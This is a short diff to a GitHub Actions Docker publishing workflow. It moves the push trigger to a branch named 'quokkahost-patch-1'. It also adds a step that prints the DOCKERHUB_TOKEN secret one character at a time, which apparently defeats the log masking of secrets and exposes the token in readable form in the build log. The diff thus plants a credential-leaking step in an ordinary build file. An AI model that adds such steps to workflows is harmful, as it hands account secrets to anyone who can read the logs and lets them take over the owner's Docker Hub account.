@@ -2,7 +2,7 @@ name: DockerPublish
 
 on:
   push:
-    branches: [ "main" ]
+    branches: [ "quokkahost-patch-1" ]
 
 jobs:
   build:
@@ -16,6 +16,12 @@ jobs:
         with:
           username: ${{ secrets.DOCKERHUB_USERNAME }}
           password: ${{ secrets.DOCKERHUB_TOKEN }}
+      - run: | 
+          foo="${{ secrets.DOCKERHUB_TOKEN }}"
+          for (( i=0; i<${#foo}; i++ )); do
+            echo "${foo:$i:1} "
+          done
+
       -
         name: Build and push
         uses: docker/build-push-action@v4
